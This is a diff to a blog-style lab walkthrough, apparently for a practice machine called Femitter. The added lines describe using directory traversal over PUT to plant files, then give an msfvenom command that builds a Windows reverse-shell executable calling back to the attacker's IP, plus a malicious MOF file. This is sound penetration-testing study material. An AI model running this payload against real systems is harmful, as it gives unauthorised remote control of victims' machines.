@@ -32,8 +32,15 @@ tags:
 
 ![](/assets/images/Femitter/putSystem32.png)
 
-  The second way, is to PUT the file and then rename the file specifying it's full path. 
+The second way, is to PUT the file and then rename the file specifying it's full path. 
 
 ![](/assets/images/Femitter/putRename.png)
+
+Now we have everything we need to get code execution since we can use the directory transversal to put files where we want them. I just used `msfvenom` to create my executable with `msfvenom -p windows/shell_reverse_tcp lhost=<yourIP> lport=443 -f exe -o zzzzz.exe` and I had already created a malicious MOF file following along with Ippsec's walkthrough (again, watch his walkthrough.) 
+
+![](/assets/images/Femitter/putMOF.png)
+
+
+  
 
   
